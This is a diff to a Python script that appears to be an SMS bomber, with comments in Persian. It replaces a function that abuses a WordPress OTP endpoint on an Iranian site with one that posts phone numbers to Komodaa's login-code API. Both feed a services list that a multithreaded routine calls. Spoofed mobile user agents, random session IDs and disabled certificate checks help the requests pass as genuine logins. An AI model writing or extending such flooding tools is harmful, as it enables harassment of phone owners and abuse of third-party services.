@@ -103,85 +103,58 @@ def SibApp(phone):
         print(f'{r}[!] SibApp Exception: {e}{a}')
         return False
 
-import requests, re, random, socket, dns.resolver
-
-def nillarayeshi(phone):
+def Komodaa(phone):
     try:
-        # --- تنظیم DNS گوگل برای resolve کردن ---
-        resolver = dns.resolver.Resolver()
-        resolver.nameservers = ["8.8.8.8"]  # DNS گوگل
-        answer = resolver.resolve("nillarayeshi.com", "A")
-        ip = answer[0].to_text()  # آی‌پی واقعی سایت از DNS گوگل
-
-        # --- آماده‌سازی شماره ---
+        url = "https://api.komodaa.com/api/v2.6/loginRC/request"
+        
+        # فرمت شماره
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
-
-        csrf = "34baf6a4f4"
-        nonce = "34baf6a4f4"
-
-        payload = {
-            "action": "digits_check_mob",
-            "countrycode": "+98",
-            "mobileNo": formatted_phone,
-            "csrf": csrf,
-            "login": "2",
-            "username": "",
-            "email": "",
-            "captcha": "",
-            "captcha_ses": "",
-            "digits": "1",
-            "json": "1",
-            "whatsapp": "0",
-            "digits_reg_name": "name1234",
-            "digregcode": "+98",
-            "digits_reg_mail": formatted_phone,
-            "digregscode2": "+98",
-            "mobmail2": "",
-            "digits_reg_password": "",
-            "dig_otp": "",
-            "code": "",
-            "dig_reg_mail": "",
-            "dig_nounce": nonce
-        }
-
+        formatted_phone = f"0{formatted_phone}"
+        
         headers = {
-            "User-Agent": random.choice(user_agents),
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "Accept": "*/*",
-            "X-Requested-With": "XMLHttpRequest",
-            "Origin": "https://nillarayeshi.com",
-            "Referer": "https://nillarayeshi.com/",
-            "Host": "nillarayeshi.com",   # باید همون دامنه بمونه
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "web-user-agent": "komodaa/7.0.1.301 Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+            "install-ref": "WEB",
+            "k-session-id": f"{uuid.uuid4().hex}-{uuid.uuid4().hex[:12]}",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1"
         }
-
-        url = f"https://{ip}/wp-admin/admin-ajax.php"
-
+        
+        payload = {
+            "phone_number": formatted_phone
+        }
+        
         response = requests.post(
-            url,
-            data=payload,
-            headers=headers,
+            url, 
+            json=payload, 
+            headers=headers, 
             timeout=10,
             verify=False
         )
-
-        if response.status_code == 200:
-            if "code" in response.text:
-                print(f'{g}(nillarayeshi) SMS Sent Successfully!{a}')
-                return True
-            else:
-                print(f'{r}[-] nillarayeshi Error: {response.text}{a}')
-                return False
+        
+        print(f'{y}[Debug] Komodaa Status: {response.status_code}{a}')
+        print(f'{y}[Debug] Komodaa Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(Komodaa) SMS Sent Successfully!{a}')
+            return True
         else:
-            print(f'{r}[-] nillarayeshi HTTP Error: {response.status_code}{a}')
+            print(f'{r}[-] Komodaa Error: {response.status_code}{a}')
             return False
-
+            
     except Exception as e:
-        print(f"{r}[!] nillarayeshi Exception: {e}{a}")
+        print(f'{r}[!] Komodaa Exception: {e}{a}')
         return False
+
+
+
+
+
+
 # ==========================
 # لیست سرویس‌ها
 # ==========================
-services = [  nillarayeshi, SibApp]
+services = [  Komodaa, SibApp]
 
 # ==========================
 # تابع VIP مولتی‌تردینگ
